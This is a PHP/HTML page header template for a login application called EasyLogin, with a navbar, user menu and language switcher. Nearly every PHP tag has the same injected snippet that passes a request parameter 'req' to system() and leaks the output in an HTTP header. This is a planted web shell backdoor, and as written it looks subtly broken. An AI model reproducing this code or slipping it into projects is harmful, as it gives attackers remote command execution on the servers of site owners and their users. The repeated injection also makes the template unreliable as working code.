<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="csrf-token" content="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo csrf_token() ?>">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('img/favicon.png') ?>" rel="icon">

	<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (isset($pageTitle) ? $pageTitle .' | ' : '') . Config::get('app.name') ?></title>
	
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/vendor/bootstrap.min.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/bootstrap-custom.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/main.css') ?>" rel="stylesheet">
	<!-- <link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/flat.css') ?>" rel="stylesheet"> -->

	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $color = Config::get('app.color_scheme'); ?>
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("css/colors/{$color}.css") ?>" rel="stylesheet" id="color_scheme">

	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/jquery-1.11.1.min.js') ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/bootstrap.min.js') ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/easylogin.js') ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/main.js') ?>"></script>
	<script>
		EasyLogin.options = {
			ajaxUrl: '<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("ajax.php") ?>',
			lang: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo json_encode(trans('main.js')) ?>,
			debug: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.debug')?1:0 ?>,
		};
	</script>
</head>
<body>
	<div class="navbar navbar-fixed-top navbar-top">
    	<div class="container">
        	<div class="navbar-header">
         		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            		<span class="sr-only">Toggle navigation</span>
            		<span class="icon-bar"></span>
            		<span class="icon-bar"></span>
            		<span class="icon-bar"></span>
          		</button>
          		<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url() ?>" class="navbar-brand">EL<sup>PRO</sup></a>
        	</div>
        	<div class="navbar-collapse collapse">
	          	<ul class="nav navbar-nav">
	            	
	          	</ul>
	          	<ul class="nav navbar-nav navbar-pull-right">

	          		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::check()): ?>
	          			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('dashboard')): ?>
	          				<li>
	          					<a href="admin.php" class="nav-btn" data-toggle="tooltip" data-placement="bottom" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.admin_dashboard'); ?>">
	          						<span class="glyphicon glyphicon-cog"></span>
	          					</a>
	          				</li>
	          			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

	          			<li>
	          				<a href="#" class="nav-btn pm-open-modal" data-toggle="tooltip" data-placement="bottom" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.pms'); ?>">
	          					<span class="label label-danger pm-notification"></span>
	          					<span class="glyphicon glyphicon-envelope"></span>
	          				</a>
	          			</li>

	          			<li class="dropdown ">
							<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->display_name ?>
								<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->avatar ?>" class="avatar"> <b class="caret"></b></a>
							<ul class="dropdown-menu">
								<li><a href="profile.php?u=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->id ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.my_profile'); ?></a></li>
								<li><a href="settings.php"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.settings'); ?></a></li>
								<li><a href="logout.php"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.logout'); ?></a></li>
							</ul>
						</li>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>

		          		<li><a href="#" data-toggle="modal" data-target="#loginModal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.login'); ?></a></li>
		          		<li><a href="#" data-toggle="modal" data-target="#signupModal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.signup'); ?></a></li>
		          		<li class="dropdown">
		          			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
		          				$locales = Config::get('app.locales');
		          				$current = Lang::getLocale();
		          			?>
							<a href="#" class="dropdown-toggle" data-toggle="dropdown"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.language'); ?>: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $locales[$current] ?><b class="caret"></b></a>
							<ul class="dropdown-menu">
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); unset($locales[$current]);
								foreach ($locales as $key => $lang) : ?>
									<li>
										<a href="?lang=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>&r=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo get_current_url() ?>">
											<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("img/flags/{$key}.png") ?>" class="country-flag"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $lang ?>
										</a>
									</li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
							</ul>
						</li>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif; ?>
	          	</ul>
        	</div>
      	</div>
    </div>
    <div class="container">